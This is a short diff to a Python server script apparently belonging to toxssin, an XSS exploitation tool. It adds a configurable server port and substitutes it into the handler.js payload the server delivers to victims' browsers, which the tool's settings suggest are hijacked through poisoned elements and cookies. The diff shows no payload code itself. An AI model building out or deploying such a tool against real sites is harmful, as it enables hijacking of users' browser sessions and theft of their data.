@@ -92,6 +92,14 @@ if args.url:
 		parser.print_usage()
 		sys.exit(1)
 	 
+if args.port:
+	try:
+		toxssin_server_port = str(args.port)
+	except IndexError:
+		parser.print_usage()
+		sys.exit(1)
+else:
+    toxssin_server_port = '443'
 
 # -------------- General Functions -------------- #                                                            
 def print_banner():
@@ -306,6 +314,7 @@ class Toxssin(BaseHTTPRequestHandler):
 	
 	preferences = {
 		'*TOXSSIN_SERVER*' : toxssin_server_url,
+		'*TOXSSIN_PORT*' : toxssin_server_port,
 		'*POISON_HASH_LINKS*' : 'false',
 		'*HANDLER*' : handler,
 		'*POISON_ELEMENTS*' : poison_elements,
@@ -372,7 +381,7 @@ class Toxssin(BaseHTTPRequestHandler):
 			handler_src = open(f'./handler.js', 'r')
 			payload = handler_src.read()
 			handler_src.close()
-			payload = payload.replace('*TOXSSIN_SERVER*', Toxssin.preferences["*TOXSSIN_SERVER*"]).replace('*COOKIE_AGE*', cookie_age)			
+			payload = payload.replace('*TOXSSIN_SERVER*', Toxssin.preferences["*TOXSSIN_SERVER*"]).replace('*COOKIE_AGE*', cookie_age).replace('*TOXSSIN_PORT*', Toxssin.preferences["*TOXSSIN_PORT*"])			
 			self.wfile.write(bytes(payload, "utf-8"))
 			
 		
